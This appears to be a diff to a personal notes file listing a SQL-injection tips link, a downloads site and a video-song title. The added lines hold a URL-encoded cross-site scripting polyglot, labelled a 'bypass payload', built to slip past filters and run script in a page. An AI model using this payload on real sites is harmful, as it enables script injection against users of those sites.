@@ -7,3 +7,7 @@ https://gerbenjavado.com/manual-sql-injection-discovery-tips/ -> Using SQLmap n 
 Downloads -> https://www.dr-farfar.com/
 
 Ividoru Chankilu Video Song
+
+Bypass payload jaVasCript%3a%2f%2a-%2f%2a%60%2f%2a%5c%60%2f%2a%27%2f%2a%22%2f%2a%2a%2f(%2f%2a%20%2a%2foNcliCk%3dalert()%20)%2f%2f%0D%0A%0D%0A%2f%2f%3c%2fstYle%2f%3c%2ftitLe%2f%3c%2fteXtarEa%2f%3c%2fscRipt%2f--!%3e%5cx3csVg%2f%3csVg%2foNloAd%3dalert(document%2edomain)%2f%2f%3e%5cx3e#
+
+
